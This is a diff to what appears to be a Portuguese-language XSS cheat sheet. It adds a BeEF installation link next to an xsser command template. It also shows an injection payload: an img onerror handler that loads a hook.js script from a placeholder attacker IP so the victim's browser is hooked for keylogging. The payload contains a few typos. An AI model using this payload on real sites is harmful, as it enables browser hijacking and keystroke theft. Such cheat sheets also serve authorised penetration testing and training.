@@ -65,6 +65,7 @@ xsser --url "[URL]?[campo]=[valor]&[campo]=[valor]&[campo]=XSS&[campo]=[valor]&[
 ```
 
 ## XSS Keylogger com BeF
+Link: https://github.com/beefproject/beef/wiki/Installation
 ```
 <img/src=x style="display:nome" onerror="s=docment.createElement('script');s.setAttribute('src','http://[IP-BEFF]:[PORT]/hook.js');document.head.appendChild(s)">
 
